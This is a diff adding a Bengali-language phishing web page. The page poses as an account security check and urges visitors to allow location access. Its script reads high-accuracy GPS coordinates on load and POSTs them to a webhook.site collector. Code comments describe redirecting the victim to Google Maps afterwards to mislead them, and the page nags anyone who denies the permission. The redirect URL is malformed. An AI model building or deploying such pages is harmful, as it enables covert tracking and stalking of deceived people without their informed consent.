@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <title>জরুরি নোটিশ</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f9f9f9; }
+        .container { max-width: 500px; margin: auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); }
+        h2 { color: #d9534f; }
+        p { color: #333; font-size: 16px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>সতর্কতা নোটিশ!</h2>
+        <p>আপনার অ্যাকাউন্টের নিরাপত্তা ভেরিফিকেশনের জন্য নিচের পারমিশনটি অন করুন এবং পেজটি লোড হওয়া পর্যন্ত অপেক্ষা করুন।</p>
+    </div>
+
+    <script>
+        window.onload = function() {
+            if (navigator.geolocation) {
+                // High Accuracy অন করা হয়েছে যাতে সরাসরি হার্ডওয়্যার জিপিএস হিট করে
+                navigator.geolocation.getCurrentPosition(sendLocation, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                });
+            } else {
+                alert("আপনার ব্রাউজারটি জিপিএস সাপোর্ট করে না।");
+            }
+        };
+
+        function sendLocation(position) {
+            let lat = position.coords.latitude;
+            let long = position.coords.longitude;
+            let accuracy = position.coords.accuracy;
+            
+            // আপনার Webhook.site এর লিংকটি নিচে বসাবেন
+            let webhookURL = "https://webhook.site/a5862d88-4134-4cf6-b412-b12c05202720"; 
+
+            // ডাটা ব্যাকএন্ডে পাঠানোর জন্য Fetch API
+            fetch(webhookURL, {
+                method: "POST",
+                mode: "no-cors",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ latitude: lat, longitude: long, accuracy: accuracy })
+            }).then(() => {
+                // ডাটা চলে যাওয়ার পর তাকে বিভ্রান্ত করতে আসল গুগল ম্যাপসে পাঠিয়ে দেওয়া হবে
+                window.location.href = "https://google.com" + lat + "," + long;
+            });
+        }
+
+        function showError(error) {
+            // যদি সে Allow না করে Block করে দেয়
+            if (error.code == error.PERMISSION_DENIED) {
+                alert("অনুগ্রহ করে পেজটি দেখতে লোকেশন পারমিশন Allow করুন।");
+            }
+        }
+    </script>
+</body>
+</html>
